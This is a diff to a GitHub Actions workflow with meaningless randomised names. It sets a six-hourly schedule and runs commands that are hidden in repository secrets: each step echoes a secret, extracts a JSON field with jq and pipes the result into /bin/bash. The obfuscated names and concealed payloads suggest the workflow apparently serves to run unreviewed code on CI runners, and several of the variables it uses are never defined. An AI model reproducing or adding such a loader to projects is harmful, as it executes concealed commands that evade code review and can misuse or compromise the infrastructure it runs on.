@@ -3,22 +3,18 @@ name: nijiuhen6152
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 0/6 * * *'
+    - cron: '4 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: nijiuhen6152
         env:
-          px94: ${{ secrets.px94 }}
+          axpgv39953: ${{ secrets.axpgv39953 }}
         run: |
-          echo $px94 | jq -r .ec843 | /bin/bash
-          echo $niel4 | jq -r .ltt8 | /bin/bash
-          echo $szw4429 | jq -r .secx3 | /bin/bash
-          echo $ub0 | jq -r .jew42 | /bin/bash
-          echo $d9356 | jq -r .ciq580 | /bin/bash
-          echo $hy0 | jq -r .ympe7 | /bin/bash
-          echo $cufbz1341 | jq -r .apf4247 | /bin/bash
-          echo $sp254 | jq -r .fppj933 | /bin/bash
+          echo $axpgv39953 | jq -r .so12634 | /bin/bash
+          echo $sv2947 | jq -r .rpwd14594 | /bin/bash
+          echo $eyex51 | jq -r .vw5 | /bin/bash
 
